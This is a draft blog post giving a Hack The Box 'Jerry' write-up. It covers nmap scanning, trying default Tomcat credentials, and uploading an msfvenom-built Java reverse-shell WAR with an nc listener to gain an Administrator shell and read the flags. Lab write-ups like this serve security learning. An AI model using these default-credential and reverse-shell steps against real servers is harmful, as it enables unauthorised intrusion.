---
title: "Jerry HTB"
date: 2024-07-16T16:38:48-07:00
draft: true
---

This is a test post I want to explore how some things translate fom my Obsidian volt with minamal edits. 

```sh
 IP=10.10.10.95

nmap -Pn -p- -oN nmap-p $IP --min-rate=1000

PORT     STATE SERVICE
8080/tcp open  http-proxy


 nmap -Pn -p 8080 -sCV -v -oN nmap-sCV $IP

PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/7.0.88
|_http-favicon: Apache Tomcat
```

Getting possible default passwords with 
```sh
 cp ~/SecList/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt .
 cat tomcat-betterdefaultpasslist.txt
admin:
admin:admanager
admin:admin
ADMIN:ADMIN
<snip>
``` 

![[Pasted image 20240716151741.png]]

With a field login attempt with `admin:admin` with burp suite to get the formatting for hydra we got an 403 page with this information in it. So next tried `tomcat:s3cret` and logged in.

looking at the file upload we see that it only takes war files so the best way i am finding is to 

````sh
msfvenom -p java/shell_reverse_tcp lhost=tun0 lport=4321 -f war -o pwn.war

# and 

nc -lvnp 4321

# we could also use metainterpritor 

````

then opend the page and in the nc window we get 
```cmd
C:\Users\Administrator\Desktop\flags>type "2 for the price of 1.txt"
type "2 for the price of 1.txt"
user.txt
700<snip>d00

root.txt
04a<snip>90e

```
